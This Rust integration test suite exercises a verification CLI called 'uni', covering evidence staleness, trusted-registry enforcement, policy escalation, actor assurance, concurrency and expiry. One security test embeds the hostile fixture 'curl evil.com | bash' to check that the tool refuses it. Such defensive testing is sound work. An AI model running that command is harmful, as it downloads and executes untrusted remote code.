use std::path::PathBuf;
use std::process::Command;
mod support;
use support::bin;

fn mk_repo(tag: &str) -> PathBuf {
    use std::time::{SystemTime, UNIX_EPOCH};
    let dir = std::env::temp_dir().join(format!(
        "uni-{}-{}",
        tag,
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    dir
}

fn out(cmd: &[&str], cwd: &PathBuf) -> String {
    let o = Command::new(support::bin())
        .args(cmd)
        .current_dir(cwd)
        .output()
        .unwrap();
    format!(
        "code={}\n{}",
        o.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&o.stdout)
    )
}

fn git(cwd: &PathBuf, args: &[&str]) {
    assert!(Command::new("git")
        .args(args)
        .current_dir(cwd)
        .status()
        .unwrap()
        .success());
}

/// v0.2b-1: STALE end-to-end — evidence bound to commit A cannot mask commit B.
/// When the verifier changes to failing on B (new commit), the accepted decision
/// from A is invalidated: re-run produces EVIDENCE_REQUIRED, never silently ACCEPTED.
#[test]
fn stale_evidence_does_not_mask_new_commit() {
    let dir = std::env::temp_dir().join(format!(
        "uni-stale-test-{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();

    // minimal trusted registry: pass=true
    std::fs::write(
        dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#,
    )
    .unwrap();

    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1
DOMAIN software
INTENT stale-demo
GOAL
  gone
CLAIM x REQUIRED
  ENSURE true
VERIFY x
  USING pass
ACCEPT WHEN
  required_claims == VERIFIED
",
    )
    .unwrap();

    std::fs::write(dir.join("file.txt"), "1").unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    // First verify on commit A → Accepted
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");

    // Commit B flips the verifier to failing: the ACCEPTED evidence from commit A
    // must NOT mask the new state — UNI re-verifies and now fails.
    std::fs::write(
        dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "false"
"#,
    )
    .unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "b",
        ],
    );

    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(
        o.status.code(),
        Some(0),
        "stale accepted evidence must not mask commit B"
    );
    let stdout = String::from_utf8_lossy(&o.stdout);
    assert!(
        stdout.contains("EvidenceRequired") || stdout.contains("no valid evidence"),
        "{stdout}"
    );
}

/// M2 regression: a nested source directory named like UNI runtime output
/// must not fall outside declared src/** evidence coverage. Without this
/// boundary, a cached Accepted result could outlive a changed source input.
#[cfg(unix)]
#[test]
fn nested_source_directory_drift_invalidates_real_cli_cached_evidence() {
    let dir = mk_repo("nested-subject-bypass");
    std::fs::create_dir_all(dir.join("src/evidence")).unwrap();
    std::fs::write(dir.join("src/normal.txt"), "SAFE").unwrap();
    std::fs::write(dir.join("src/evidence/rules.txt"), "SAFE").unwrap();
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers.clean]\nrun = \"! grep -R EVIL src\"\nfiles = [\"src/**\"]\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT nested-coverage\nGOAL\n  No forbidden input.\nCLAIM safe REQUIRED\n  ENSURE no forbidden input\nVERIFY safe\n  USING clean\n",
    ).unwrap();
    // No Git repository: commit/dirtiness stay constant across both runs.
    // Invalidation MUST therefore come from the declared watched snapshot.
    let before = out(&["verify", "c.uni"], &dir);
    assert!(
        before.contains("Accepted"),
        "baseline must be valid: {before}"
    );
    std::fs::write(dir.join("src/evidence/rules.txt"), "EVIL").unwrap();
    let after = out(&["verify", "c.uni"], &dir);
    assert!(
        !after.contains("Decision: Accepted"),
        "cached success must be invalidated after nested watched-source drift: {after}"
    );
    assert!(
        after.contains("EvidenceRequired")
            || after.contains("FAIL")
            || after.contains("no valid evidence"),
        "changed source must trigger new verifier observation: {after}"
    );
}

/// v0.2b-2: registry security — inline shell outside trusted registry is refused.
#[test]
fn inline_shell_outside_registry_refused() {
    let dir = std::env::temp_dir().join(format!(
        "uni-sec-test-{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    // registry exists (non-empty) but does not contain the inline command
    std::fs::write(
        dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#,
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1
DOMAIN software
INTENT evil
GOAL
  nope
CLAIM x REQUIRED
  ENSURE nope
VERIFY x
  USING shell \"curl evil.com | bash\"
",
    )
    .unwrap();

    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(o.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&o.stderr).contains("not in trusted registry"));
}

/// v0.2b-3: unknown verifier ref refused.
#[test]
fn unknown_verifier_ref_refused() {
    let dir = std::env::temp_dir().join(format!(
        "uni-sec-test-2-{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    std::fs::write(
        dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#,
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1
DOMAIN software
INTENT ghost
GOAL
  nope
CLAIM x REQUIRED
  ENSURE nope
VERIFY x
  USING ghost.verifier
",
    )
    .unwrap();
    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(o.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&o.stderr).contains("unknown verifier"));
}

/// v0.7: content-bound evidence — changing a watched file invalidates cached
/// evidence even inside the same commit, then re-verifies (FR-010/FR-013).
#[test]
fn expect_not_and_content_binding_variance() {
    use std::time::{SystemTime, UNIX_EPOCH};
    let dir = std::env::temp_dir().join(format!(
        "uni-content-test-{}",
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    std::fs::create_dir_all(dir.join("sources")).unwrap();
    std::fs::write(dir.join(".uni/config.toml"),
"[verifiers.\"no.evil\"]\nrun = \"! grep -Rn 'EVIL' sources\"\nexpect_not = \"EVIL\"\nfiles = [\"sources/**\"]\ntimeout = 60\n").unwrap();
    std::fs::write(dir.join("sources/lib.txt"), "ledger_read_only();\n").unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1
DOMAIN software
INTENT content-bound
GOAL
  clean
CLAIM x REQUIRED
  ENSURE no EVIL
VERIFY x
  USING no.evil
",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    // clean tree → Accepted
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");

    // same commit, but watched file content changes → cached evidence stale, re-run fails, blocked
    std::fs::write(dir.join("sources/lib.txt"), "EVIL_WRITE(ledger);\n").unwrap();
    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(
        o.status.code(),
        Some(0),
        "content change must invalidate cached evidence"
    );
    let stdout = String::from_utf8_lossy(&o.stdout);
    assert!(
        stdout.contains("no valid evidence") || stdout.contains("FAIL"),
        "{stdout}"
    );

    // restored content matches the original hash → cached evidence valid again
    std::fs::write(dir.join("sources/lib.txt"), "ledger_read_only();\n").unwrap();
    let r3 = out(&["verify", "c.uni"], &dir);
    assert!(r3.contains("Accepted"), "{r3}");
}

/// v0.18 regression: evidence must NOT be reusable across contracts sharing a
/// claim id (cache isolation by verifier fingerprint).
#[test]
fn evidence_cannot_cross_contract_boundary() {
    let dir = mk_repo("evidence-isolation");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"ok\" = \"true\"\n\"bad\" = \"false\"\n",
    )
    .unwrap();
    std::fs::write(dir.join("c1.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c1\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING ok\n").unwrap();
    std::fs::write(dir.join("c2.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c2\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING bad\n").unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "base",
        ],
    );

    let o1 = Command::new(bin())
        .args(["verify", "c1.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_eq!(o1.status.code(), Some(0), "c1 should ACCEPT");
    let o2 = Command::new(bin())
        .args(["verify", "c2.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(
        o2.status.code(),
        Some(0),
        "c2 must NOT reuse c1 evidence for claim x"
    );
}

/// v0.18 regression: expect_not is matched against the FULL output, not the
/// 2000-char excerpt (forbidden content beyond the window must invalidate).
#[test]
fn expect_not_beyond_excerpt_window_invalidates() {
    let dir = mk_repo("expect-not-window");
    std::fs::write(dir.join(".uni/config.toml"),
        "[verifiers.\"catbig\"]\nrun = \"printf x%.0s $(seq 3000) && echo EVIL_TAIL\"\nexpect_not = \"EVIL_TAIL\"\n").unwrap();
    std::fs::write(dir.join("c.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c3\nGOAL\n g\nCLAIM y REQUIRED\n  ENSURE clean\nVERIFY y\n  USING catbig\n").unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "base",
        ],
    );
    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(
        o.status.code(),
        Some(0),
        "hidden EVIL_TAIL must invalidate evidence"
    );
}

/// v0.19 regression (A3): two concurrent verifies must never corrupt state.
/// Both must exit 0, last.json must parse, every journal line must be complete JSON.
#[test]
fn concurrent_verify_never_corrupts_state() {
    use std::time::{SystemTime, UNIX_EPOCH};
    let dir = std::env::temp_dir().join(format!(
        "uni-conc-{}",
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis()
    ));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"p\" = \"true\"\n",
    )
    .unwrap();
    std::fs::write(dir.join("c1.uni"), "VERSION 0.1\nDOMAIN software\nINTENT k1\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n").unwrap();
    std::fs::write(dir.join("c2.uni"), "VERSION 0.1\nDOMAIN software\nINTENT k2\nGOAL\n g\nCLAIM y REQUIRED\n  ENSURE g\nVERIFY y\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n").unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    let exe1 = bin().to_string_lossy().into_owned();
    let exe2 = exe1.clone();
    let d1 = dir.clone();
    let d2 = dir.clone();
    let h1 = std::thread::spawn(move || {
        Command::new(&exe1)
            .args(["verify", "c1.uni"])
            .current_dir(&d1)
            .output()
            .unwrap()
    });
    let h2 = std::thread::spawn(move || {
        Command::new(&exe2)
            .args(["verify", "c2.uni"])
            .current_dir(&d2)
            .output()
            .unwrap()
    });
    let o1 = h1.join().unwrap();
    let o2 = h2.join().unwrap();
    assert_eq!(
        o1.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&o1.stderr)
    );
    assert_eq!(
        o2.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&o2.stderr)
    );
    assert!(
        !dir.join(".uni/.lock").exists(),
        "lock must be released after verify"
    );
    let last = std::fs::read_to_string(dir.join(".uni/decisions/last.json")).unwrap();
    let v: serde_json::Value =
        serde_json::from_str(&last).expect("last.json must parse after races");
    assert!(v["decision"].is_string());
    for line in std::fs::read_to_string(dir.join(".uni/events.jsonl"))
        .unwrap()
        .lines()
    {
        if line.trim().is_empty() {
            continue;
        }
        let e: serde_json::Value =
            serde_json::from_str(line).expect("journal line must be complete JSON");
        assert!(e["event"].is_string());
    }
}

/// B1: a policy change governs the recomputed decision without touching code.
/// Setup accepts under the default policy; then escalate_on_stale is committed
/// and the watched content changes (commit moves AND output expectation breaks).
/// The stale proof cannot be renewed -> Escalated, not merely EvidenceRequired.
#[test]
fn policy_change_governs_recomputed_decision() {
    let dir = mk_repo("policy-recompute");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers.\"p\"]\nrun = \"cat marker.txt\"\nexpect = \"ready\"\n",
    )
    .unwrap();
    std::fs::create_dir_all(dir.join(".uni/policies")).unwrap();
    std::fs::write(dir.join("marker.txt"), "ready\n").unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT pol\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");

    // New policy only (committed): stale-but-unreprovable escalates.
    std::fs::write(
        dir.join(".uni/policies/strict.toml"),
        "[policy]\nescalate_on_stale = true\n",
    )
    .unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "strict",
        ],
    );
    // Break the watched content and commit: previous proof goes stale AND the
    // re-run cannot renew it (expectation miss).
    std::fs::write(dir.join("marker.txt"), "trash\n").unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "break-it",
        ],
    );

    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&o.stdout).to_string();
    assert!(
        stdout.contains("Escalated") && stdout.contains("escalate_on_stale"),
        "new policy must govern the recompute, got: {stdout}"
    );
}

/// B2: registry change names what changed, flags CI JSON once, then clears.
#[test]
fn registry_change_flags_trust_boundary_once() {
    let dir = mk_repo("registry-diff");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"p\" = \"true\"\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT tb\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");
    assert!(dir.join(".uni/.registry.hash").exists());
    assert!(dir.join(".uni/.registry.snapshot.toml").exists());

    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"p\" = \"true\"\n\"q\" = \"false\"\n",
    )
    .unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "regchange",
        ],
    );

    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&o.stdout).to_string();
    assert!(stdout.contains("REGISTRY_CHANGED"), "{stdout}");
    assert!(
        stdout.contains("1 added") && stdout.contains("- q"),
        "{stdout}"
    );

    let j = Command::new(bin())
        .args(["--json", "verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let v: serde_json::Value = serde_json::from_slice(&j.stdout).unwrap();
    assert_eq!(
        v["trust_boundary_changed"], false,
        "baseline acknowledged by the human run"
    );

    // A new drift raises the flag again on the very run that observes it.
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"p\" = \"true\"\n\"q\" = \"true\"\n",
    )
    .unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "regchange2",
        ],
    );
    let j2 = Command::new(bin())
        .args(["--json", "verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let v2: serde_json::Value = serde_json::from_slice(&j2.stdout).unwrap();
    assert_eq!(v2["trust_boundary_changed"], true);
}

/// B3: default verify caps at A2; --actor reaches A3-D but never A3;
/// identity stays SELF-DECLARED; --attest refuses (A4 reserved).
#[test]
fn actor_model_caps_assurance_honestly() {
    let dir = mk_repo("actor-caps");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"p\" = \"true\"\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT act\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    // Default: local actor, max A2.
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");
    let rep = Command::new(bin())
        .args(["report", "--json"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let v: serde_json::Value = serde_json::from_slice(&rep.stdout).unwrap();
    assert_eq!(v["assurance"], "A2", "{v}");
    assert_eq!(v["independent_actor"], false);

    // Explicit distinct actor: independence YES, identity still SELF-DECLARED, max A3-D.
    let o = Command::new(bin())
        .args(["verify", "--actor", "ci:build-12", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_eq!(
        o.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&o.stderr)
    );
    let rep2 = Command::new(bin())
        .args(["report", "--json"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let v2: serde_json::Value = serde_json::from_slice(&rep2.stdout).unwrap();
    assert_eq!(v2["assurance"], "A3-D", "{v2}");
    assert_eq!(v2["independent_actor"], true);
    assert_eq!(v2["identity_assurance"], "SELF-DECLARED");

    // A scheme prefix without an adapter proves nothing: still A3-D at best.
    let o3 = Command::new(bin())
        .args(["verify", "--actor", "spiffe://acme/verifier/b12", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_eq!(o3.status.code(), Some(0));
    let rep3 = Command::new(bin())
        .args(["report", "--json"])
        .current_dir(&dir)
        .output()
        .unwrap();
    let v3: serde_json::Value = serde_json::from_slice(&rep3.stdout).unwrap();
    assert_eq!(v3["assurance"], "A3-D", "{v3}");
    assert_eq!(v3["identity_assurance"], "SELF-DECLARED");

    // --attest is a hard refusal: A4 has no producer yet.
    let o4 = Command::new(bin())
        .args(["verify", "--attest", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(o4.status.code(), Some(0));
    assert!(
        String::from_utf8_lossy(&o4.stderr).contains("reserved"),
        "{}",
        String::from_utf8_lossy(&o4.stderr)
    );
}

/// B4: resolution requirements execute only under an authorized binding.
/// Unbound -> hard error with the exact command; bound -> works; requirement
/// text change -> old proof stales and renews under the new binding hash.
#[test]
fn requirement_needs_authorized_binding() {
    let dir = mk_repo("binding-cycle");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"suite\" = \"true\"\n",
    )
    .unwrap();
    let contract = "VERSION 0.1\nDOMAIN software\nINTENT bd\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING suite\n  REQUIRE behavior(\"does x\")\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n";
    std::fs::write(dir.join("c.uni"), contract).unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    // 1. Unbound requirement: hard error naming the exact command, no execution.
    let o = Command::new(bin())
        .args(["verify", "c.uni"])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_ne!(o.status.code(), Some(0));
    let err = String::from_utf8_lossy(&o.stderr).to_string();
    assert!(err.contains("uni bind --claim x --verifier suite"), "{err}");

    // 2. Authorize, then verify accepts.
    let b = Command::new(bin())
        .args([
            "bind",
            "--claim",
            "x",
            "--verifier",
            "suite",
            "--requirement",
            "behavior(\"does x\")",
        ])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_eq!(
        b.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&b.stderr)
    );
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");

    // 3. New requirement text lives in the CONTRACT: rewrite it, re-authorize
    // to the new text, commit. The old proof (bound to the old text) stales
    // and renews under the new binding hash, still accepting.
    let contract2 = "VERSION 0.1\nDOMAIN software\nINTENT bd\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING suite\n  REQUIRE behavior(\"does x, v2\")\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n";
    std::fs::write(dir.join("c.uni"), contract2).unwrap();
    let b2 = Command::new(bin())
        .args([
            "bind",
            "--claim",
            "x",
            "--verifier",
            "suite",
            "--requirement",
            "behavior(\"does x, v2\")",
        ])
        .current_dir(&dir)
        .output()
        .unwrap();
    assert_eq!(b2.status.code(), Some(0));
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "req-v2",
        ],
    );
    let r2 = out(&["verify", "c.uni"], &dir);
    assert!(r2.contains("Accepted"), "{r2}");
    let journal = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
    assert!(
        journal.contains("BindingAuthorized"),
        "bind must journalize the human act"
    );
    assert!(
        journal.matches("EvidenceRun").count() >= 2,
        "re-authorization must force renewal"
    );
}

/// A verifier that creates untracked build output (a compiler, a bundler)
/// must not invalidate its own fresh evidence: dirtiness is about tracked
/// content, not about scratch files.
#[test]
fn build_artifacts_do_not_stale_own_evidence() {
    let dir = mk_repo("self-dirty");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers]\n\"build\" = \"mkdir -p target/debug && echo x > target/debug/out && true\"\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT selfdirty\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING build\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );
    let first = out(&["verify", "c.uni"], &dir);
    assert!(
        first.contains("Accepted"),
        "untracked build output must not stale evidence: {first}"
    );
    let second = out(&["verify", "c.uni"], &dir);
    assert!(second.contains("Accepted"), "{second}");
}

/// Evidence Completeness: a verifier that declares watched files it cannot
/// observe has not covered its subject. It must be Invalid, never a cache
/// entry that later counts as a hit when the files appear.
#[test]
fn declared_watch_matching_nothing_is_invalid() {
    let dir = mk_repo("empty-watch");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers.\"watch\"]\nrun = \"true\"\nfiles = [\"dist/**\"]\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT watch\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING watch\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    let first = out(&["verify", "c.uni"], &dir);
    assert!(
        first.contains("EvidenceRequired"),
        "unobservable subject must not verify: {first}"
    );

    // Now the watched files exist: the previous run left no reusable proof.
    std::fs::create_dir_all(dir.join("dist")).unwrap();
    std::fs::write(dir.join("dist/out.bin"), b"artifact").unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "artifact",
        ],
    );
    let second = out(&["verify", "c.uni"], &dir);
    assert!(
        second.contains("Accepted"),
        "with the subject observable it verifies: {second}"
    );

    // A change to the watched subject must not reuse the previous proof: the
    // verifier command is `true` (so the decision is unchanged), but the
    // journal must record that the old evidence went stale.
    let before = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
    let stale_before = before.matches("EvidenceStale").count();
    std::fs::write(dir.join("dist/out.bin"), b"tampered").unwrap();
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "tamper",
        ],
    );
    let _ = out(&["verify", "c.uni"], &dir);
    let after = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
    assert!(
        after.matches("EvidenceStale").count() > stale_before,
        "subject drift must stale the previous proof, journal:\n{after}"
    );
}

/// Time dimension: a verifier may declare `max_age_hours`. Once the proof is
/// older than its window it is stale, so the verifier runs again. The expiry
/// travels on the evidence, so a registry change cannot extend it.
#[test]
fn expired_evidence_is_reestablished() {
    let dir = mk_repo("expiry");
    std::fs::write(
        dir.join(".uni/config.toml"),
        "[verifiers.\"scan\"]\nrun = \"true\"\nmax_age_hours = 1\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("c.uni"),
        "VERSION 0.1\nDOMAIN software\nINTENT expiry\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING scan\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
    )
    .unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(
        &dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "a",
        ],
    );

    let first = out(&["verify", "c.uni"], &dir);
    assert!(first.contains("Accepted"), "{first}");

    // The stamped expiry must be recorded on the evidence file.
    let ev_file = std::fs::read_dir(dir.join(".uni/evidence"))
        .unwrap()
        .flatten()
        .map(|e| e.path())
        .find(|p| p.extension().map(|x| x == "json").unwrap_or(false))
        .expect("evidence written");
    let mut ev: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
    assert!(
        ev["expires_at"].is_string(),
        "expiry must be recorded: {ev}"
    );
    // Age it: rewrite the expiry into the past, as elapsed time would.
    let past = chrono::Utc::now() - chrono::Duration::hours(2);
    ev["expires_at"] = serde_json::json!(past.to_rfc3339());
    std::fs::write(&ev_file, serde_json::to_string_pretty(&ev).unwrap()).unwrap();

    let stale_before = std::fs::read_to_string(dir.join(".uni/events.jsonl"))
        .unwrap()
        .matches("EvidenceStale")
        .count();
    let second = out(&["verify", "c.uni"], &dir);
    assert!(
        second.contains("Accepted"),
        "a re-established proof accepts again: {second}"
    );
    let journal = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
    assert!(
        journal.matches("EvidenceStale").count() > stale_before,
        "expiry must mark the old proof stale:\n{journal}"
    );
    // And the fresh proof carries a new window.
    let ev2: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
    assert_ne!(
        ev2["expires_at"], ev["expires_at"],
        "the window must be renewed"
    );
}
